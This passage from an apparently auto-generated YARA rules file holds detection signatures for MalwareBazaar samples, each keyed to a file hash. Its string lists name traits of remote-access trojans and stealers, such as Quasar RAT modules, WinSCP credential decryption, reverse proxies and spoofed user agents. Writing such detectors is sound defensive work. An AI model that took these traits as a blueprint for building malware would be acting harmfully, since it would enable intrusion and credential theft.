        $s11 = "%s /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s12 = "HTTPSTOPM"
        $s13 = "HTTP"
        $s14 = "No such file or directory"
        $s15 = "No such process"
        $s16 = "Interrupted system call"
        $s17 = "Bad file descriptor"
        $s18 = "No child processes"
        $s19 = "Resource temporarily unavailable"
        $s20 = "File exists"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 79KB and
        all of them
}

rule Linux_2efc3095f61099305983fdfd31180a4e3b2f097c125b5a7f4b798d52cc0ebc28
{
    meta:
        description = "Auto ML: 2efc3095f61099305983fdfd31180a4e3b2f097c125b5a7f4b798d52cc0ebc28"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB and
        all of them
}

rule Windows_2f511d2b5082a059bbc56ddd78b3a2dbe221941f70b42d1e7740dbdcd4a5be12
{
    meta:
        description = "Auto ML: 2f511d2b5082a059bbc56ddd78b3a2dbe221941f70b42d1e7740dbdcd4a5be12"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Windows_2f9bf1b8e047c1fa8ec80deccb3e9b575aaf5247f23c0fea81157b8b995562c9
{
    meta:
        description = "Auto ML: 2f9bf1b8e047c1fa8ec80deccb3e9b575aaf5247f23c0fea81157b8b995562c9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "s:IDS_BROWSETITLE"
        $s9 = "s:IDS_CMDEXTRACTING"
        $s10 = "s:IDS_FILEHEADERBROKEN"
        $s11 = "s:IDS_CANNOTOPEN"
        $s12 = "s:IDS_CANNOTCREATE"
        $s13 = "s:IDS_WRITEERROR"
        $s14 = "s:IDS_READERROR"
        $s15 = "s:IDS_CLOSEERROR"
        $s16 = "s:IDS_CREATEERRORS"
        $s17 = "s:IDS_ALLFILES"
        $s18 = "s:IDS_EXTRFILESTO"
        $s19 = "s:IDS_EXTRFILESTOTEMP"
        $s20 = "s:IDS_WRONGFILEPASSWORD"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1523KB and
        all of them
}

rule Windows_2fcad226b17131da4274e1b9f8f31359bdd325c9568665f08fd1f6c5d06a23ce
{
    meta:
        description = "Auto ML: 2fcad226b17131da4274e1b9f8f31359bdd325c9568665f08fd1f6c5d06a23ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ThreadSafeObjectProvider`1"
        $s5 = "<Module>"
        $s6 = "System.IO"
        $s7 = "Create__Instance__"
        $s8 = "CreateInstance"
        $s9 = "get_GetInstance"
        $s10 = "GetHashCode"
        $s11 = "get_Message"
        $s12 = "GetTypeFromHandle"
        $s13 = "DownloadFile"
        $s14 = "WriteLine"
        $s15 = "GetType"
        $s16 = "ThreadStaticAttribute"
        $s17 = "STAThreadAttribute"
        $s18 = "StandardModuleAttribute"
        $s19 = "HideModuleNameAttribute"
        $s20 = "TargetFrameworkAttribute"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 11KB and
        all of them
}

rule Windows_2fcb6730a335fe6f41ba9d12579bdadbdc9655290132da53a4864f475a55dee9
{
    meta:
        description = "Auto ML: 2fcb6730a335fe6f41ba9d12579bdadbdc9655290132da53a4864f475a55dee9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "System.IO"
        $s13 = "wgIaDhkneJcmDxyETvV"
        $s14 = "KsEt2QRt7VcRbbS7Uuc"
        $s15 = "<Module>{5243C469-B1FB-48DA-8E86-7CF6CAACAB79}"
        $s16 = "System.Text"
        $s17 = "get_Length"
        $s18 = "get_Chars"
        $s19 = "System.Collections.Generic"
        $s20 = "System.Linq"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 828KB and
        all of them
}

rule Linux_2fcc3a77545e68783533dc61490c9678a683e97ba3a043dd7c07ea6a4fb2944d
{
    meta:
        description = "Auto ML: 2fcc3a77545e68783533dc61490c9678a683e97ba3a043dd7c07ea6a4fb2944d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB and
        all of them
}

rule Windows_03a8af6de09ff99b87a9757a8823d17801b4261f93c3d53e71283089d4a0c4bd
{
    meta:
        description = "Auto ML: 03a8af6de09ff99b87a9757a8823d17801b4261f93c3d53e71283089d4a0c4bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 366KB and
        all of them
}

rule Windows_30205eaf6f581036262bfc099dfc5cc5d0e4d771dca3d1c4cf3dada59d097672
{
    meta:
        description = "Auto ML: 30205eaf6f581036262bfc099dfc5cc5d0e4d771dca3d1c4cf3dada59d097672"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 241KB and
        all of them
}

rule Linux_302d47a448b2f83f5cfc73f9c08625da04a45978266504082ca72d06ff506da3
{
    meta:
        description = "Auto ML: 302d47a448b2f83f5cfc73f9c08625da04a45978266504082ca72d06ff506da3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "__vdso_clock_gettime"
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB and
        all of them
}

rule Windows_30352cfbcc257fe2f2ed508076a95f1d2dbf00d0953727e7a2a81b7d450cc1a1
{
    meta:
        description = "Auto ML: 30352cfbcc257fe2f2ed508076a95f1d2dbf00d0953727e7a2a81b7d450cc1a1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "DbSet`1"
        $s5 = "HashSet`1"
        $s6 = "QLChiTieuDataSet1"
        $s7 = "qLChiTieuDataSet1"
        $s8 = "<Module>"
        $s9 = "get_PmlbeC"
        $s10 = "get_IdGD"
        $s11 = "set_IdGD"
        $s12 = "get_LoaiGD"
        $s13 = "set_LoaiGD"
        $s14 = "get_IdLoaiGD"
        $s15 = "set_IdLoaiGD"
        $s16 = "get_NgayGD"
        $s17 = "set_NgayGD"
        $s18 = "System.IO"
        $s19 = "get_MoTa"
        $s20 = "set_MoTa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 819KB and
        all of them
}

rule Windows_304e790ea457aa80cdfdaa00e9715f33b97250d962ccbde98cf2515f87f45959
{
    meta:
        description = "Auto ML: 304e790ea457aa80cdfdaa00e9715f33b97250d962ccbde98cf2515f87f45959"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "DeleteFileW"
        $s8 = "FindFirstFileW"
        $s9 = "FindNextFileW"
        $s10 = "FindClose"
        $s11 = "SetFilePointer"
        $s12 = "ReadFile"
        $s13 = "GetPrivateProfileStringW"
        $s14 = "WritePrivateProfileStringW"
        $s15 = "LoadLibraryExW"
        $s16 = "GetModuleHandleW"
        $s17 = "CloseHandle"
        $s18 = "SetFileTime"
        $s19 = "CompareFileTime"
        $s20 = "GetShortPathNameW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 82449KB and
        all of them
}

rule Windows_3054cb557781a24975e1da913001c39614b179c6756a27a3c8bf870f157f7444
{
    meta:
        description = "Auto ML: 3054cb557781a24975e1da913001c39614b179c6756a27a3c8bf870f157f7444"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "`.text"
        $s2 = "`.data"
        $s3 = ".reloc"
        $s4 = "memset"
        $s5 = "CRTDLL.dll"
        $s6 = "HeapCreate"
        $s7 = "ExitProcess"
        $s8 = "GetModuleHandleA"
        $s9 = "KERNEL32.dll"
        $s10 = "CHEATHAPPENS.com Presents:"
        $s11 = "GET UPDATES FOR THIS TRAINER AT WWW.CHEATHAPPENS.COM"
        $s12 = "create these options.  CALIBER was involved with packaging and improving the"
        $s13 = "attacks and explosions.  Mostly this option was created to protect you from"
        $s14 = "allow you to aim at certain targets with better ease, etc."
        $s15 = "Numpad 8: Armory Points - make sure this is on when loading and you will be able to"
        $s16 = "weapons, etc.  It is important that you follow the following instructions!"
        $s17 = "Trainer Customizer to accomplish this! Download it from our trainer"
        $s18 = "Having trouble getting the trainer to work? Visit our forums at www.cheathappens.com"
        $s19 = "http://www.cheathappens.com/trainer_troubleshooting.asp"
        $s20 = "In an effort to maintain the integrity of the files downloaded from our site and to prevent"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 85KB and
        all of them
}

rule Windows_30960eccc60a538b6c7038d01c60fded8b4a997641653ee16efa2bd299c48b96
{
    meta:
        description = "Auto ML: 30960eccc60a538b6c7038d01c60fded8b4a997641653ee16efa2bd299c48b96"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Linux_30b4a5d4e349ee41deea619128797af9ba4149e6ea1256ed7a9dc2a183fd3965
{
    meta:
        description = "Auto ML: 30b4a5d4e349ee41deea619128797af9ba4149e6ea1256ed7a9dc2a183fd3965"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "(!PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 44KB and
        all of them
}

rule Windows_30ce264ab2bfdf9b1b2b59f6e3f2a13364b68b83d9785aaf16d9482f262c6078
{
    meta:
        description = "Auto ML: 30ce264ab2bfdf9b1b2b59f6e3f2a13364b68b83d9785aaf16d9482f262c6078"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "- unable to open console device"
        $s6 = "- unexpected multithread lock error"
        $s7 = "- not enough space for thread data"
        $s8 = "- floating point not loaded"
        $s9 = "GetLastActivePopup"
        $s10 = "GetActiveWindow"
        $s11 = "user32.dll"
        $s12 = "OLEAUT32.dll"
        $s13 = "ShowWindow"
        $s14 = "DestroyWindow"
        $s15 = "LoadStringA"
        $s16 = "LoadStringW"
        $s17 = "SetWindowTextA"
        $s18 = "SetWindowTextW"
        $s19 = "GetWindowLongA"
        $s20 = "SetWindowLongA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7466KB and
        all of them
}

rule Windows_30edfb9a936a7c0be6e8a97732bab72ec1bcc2d4bba4d8bef301ae944c8de7c2
{
    meta:
        description = "Auto ML: 30edfb9a936a7c0be6e8a97732bab72ec1bcc2d4bba4d8bef301ae944c8de7c2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Form1_Load_1"
        $s5 = "<Module>"
        $s6 = "getID"
        $s7 = "System.Collections.Generic"
        $s8 = "Thread"
        $s9 = "Form1_Load"
        $s10 = "add_Load"
        $s11 = "set_FormattingEnabled"
        $s12 = "get_InvokeRequired"
        $s13 = "set_VerticalMovementDistance"
        $s14 = "CreateInstance"
        $s15 = "set_AutoScaleMode"
        $s16 = "get_DocumentNode"
        $s17 = "set_Visible"
        $s18 = "GetTypeFromHandle"
        $s19 = "BB.Common.WinForms.Example"
        $s20 = "set_DropDownStyle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 635KB and
        all of them
}

rule Windows_317733d3aa747780789dc33fab225524789c233856815d6da5f0e819454e30a8
{
    meta:
        description = "Auto ML: 317733d3aa747780789dc33fab225524789c233856815d6da5f0e819454e30a8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "wininet.dll"
        $s7 = "kernel32.dll"
        $s8 = "kernel32"
        $s9 = "InternetOpenA"
        $s10 = "InternetConnectA"
        $s11 = "InternetCloseHandle"
        $s12 = "HttpOpenRequestA"
        $s13 = "InternetSetOptionA"
        $s14 = "HttpSendRequestA"
        $s15 = "InternetReadFile"
        $s16 = "HttpQueryInfoA"
        $s17 = "(@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
        $s18 = "http="
        $s19 = "HTTP/1.1"
        $s20 = "http://"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5908KB and
        all of them
}

rule Windows_03c775dde6ce601d449b564ec7243880d79dd2853308931c57a3e69a912efaf6
{
    meta:
        description = "Auto ML: 03c775dde6ce601d449b564ec7243880d79dd2853308931c57a3e69a912efaf6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 339KB and
        all of them
}

rule Windows_3187b0afed12d7d408ed397bd025fc13c46d627eacc94e20438a4bd0078e4f57
{
    meta:
        description = "Auto ML: 3187b0afed12d7d408ed397bd025fc13c46d627eacc94e20438a4bd0078e4f57"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Nhtlz.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "IsReadOnlyAttribute"
        $s8 = "System.Runtime.CompilerServices"
        $s9 = "System.Collections.Generic"
        $s10 = "System.Collections"
        $s11 = "TouchSocket.Rpc"
        $s12 = "TouchSocket.Rpc.TouchRpc"
        $s13 = "TouchSocket.Core"
        $s14 = "TouchSocketStatus"
        $s15 = "TouchSocket.Resources"
        $s16 = "System.IO"
        $s17 = "TouchSocket.Sockets"
        $s18 = "NotConnectedException"
        $s19 = "HttpContext"
        $s20 = "TouchSocket.Http"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 751KB and
        all of them
}

rule Linux_3193adec6dd8578bf47a67996127add2efe465f03d4645e96c6d1e86647d7a8b
{
    meta:
        description = "Auto ML: 3193adec6dd8578bf47a67996127add2efe465f03d4645e96c6d1e86647d7a8b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 152KB and
        all of them
}

rule Windows_31b26582627d2978052cdce87ae338c2e78a029f7676365e1583c05528afada0
{
    meta:
        description = "Auto ML: 31b26582627d2978052cdce87ae338c2e78a029f7676365e1583c05528afada0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "`.reloc"
        $s4 = "mscoree.dll"
        $s5 = "<Module>"
        $s6 = "GetHINSTANCE"
        $s7 = "System.IO"
        $s8 = "Read"
        $s9 = "get_CurrentThread"
        $s10 = "thread"
        $s11 = "Load"
        $s12 = "get_IsAttached"
        $s13 = "set_IsBackground"
        $s14 = "GetMethod"
        $s15 = "CreateInstance"
        $s16 = "GetTypeFromHandle"
        $s17 = "get_Module"
        $s18 = "LoadModule"
        $s19 = "get_ManifestModule"
        $s20 = "get_Name"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 425KB and
        all of them
}

rule Windows_31fb4e3de00fdb16562c1b03088df5245e45a49fb3646c90f1e5df0e9bc0acd0
{
    meta:
        description = "Auto ML: 31fb4e3de00fdb16562c1b03088df5245e45a49fb3646c90f1e5df0e9bc0acd0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1654KB and
        all of them
}

rule Windows_31ffe7c6379350a8abd75e69736fd081a58641823c4a6bf6d55fda547f360b72
{
    meta:
        description = "Auto ML: 31ffe7c6379350a8abd75e69736fd081a58641823c4a6bf6d55fda547f360b72"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "s:IDS_BROWSETITLE"
        $s9 = "s:IDS_CMDEXTRACTING"
        $s10 = "s:IDS_FILEHEADERBROKEN"
        $s11 = "s:IDS_CANNOTOPEN"
        $s12 = "s:IDS_CANNOTCREATE"
        $s13 = "s:IDS_WRITEERROR"
        $s14 = "s:IDS_READERROR"
        $s15 = "s:IDS_CLOSEERROR"
        $s16 = "s:IDS_CREATEERRORS"
        $s17 = "s:IDS_ALLFILES"
        $s18 = "s:IDS_EXTRFILESTO"
        $s19 = "s:IDS_EXTRFILESTOTEMP"
        $s20 = "s:IDS_WRONGFILEPASSWORD"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1302KB and
        all of them
}

rule Windows_320eb4a230a455a9d7b58051aa6ebf9a969347db6c33e92634bca94422ab2b99
{
    meta:
        description = "Auto ML: 320eb4a230a455a9d7b58051aa6ebf9a969347db6c33e92634bca94422ab2b99"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6289KB and
        all of them
}

rule Windows_320f473e994fdb11ab78274c29f46373fb9beee06fc6d36c4ae088f2205d4339
{
    meta:
        description = "Auto ML: 320f473e994fdb11ab78274c29f46373fb9beee06fc6d36c4ae088f2205d4339"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1992KB and
        all of them
}

rule Windows_323d242e0f3fd2288e5f4e13d64a9bbd91af3bb64b9ada1522ab6a4ca44cfc8c
{
    meta:
        description = "Auto ML: 323d242e0f3fd2288e5f4e13d64a9bbd91af3bb64b9ada1522ab6a4ca44cfc8c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Accounts Management System.....[University Version]-----[Accounting Period:1st January 2006-31st December 2006]"
        $s6 = "cmd_logoff"
        $s7 = "cmd_exit"
        $s8 = "cmd_calc"
        $s9 = "tv_asset"
        $s10 = "lbl_asset"
        $s11 = "cmd_remove"
        $s12 = "cmd_save"
        $s13 = "cmd_reset"
        $s14 = "cmd_sort"
        $s15 = "C:\\Windows\\SysWOW64\\msdbrptr.dll"
        $s16 = "MSDataReportRuntimeLib.DataReport"
